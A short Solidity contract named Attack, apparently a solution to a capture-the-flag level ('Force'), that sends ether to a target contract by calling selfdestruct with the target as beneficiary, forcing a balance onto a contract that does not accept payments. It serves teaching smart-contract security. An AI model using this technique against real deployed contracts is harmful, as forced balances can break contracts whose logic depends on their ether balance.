// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

 import "./Force.sol";

contract Attack {
    
    Force public attackContract;

   constructor(address _attackContract)public{
       attackContract=Force(payable(_attackContract));
   }

    function attack()public payable{
        require(msg.value>0);
        address payable addr =payable(address(attackContract));
        selfdestruct(addr);
    }

}
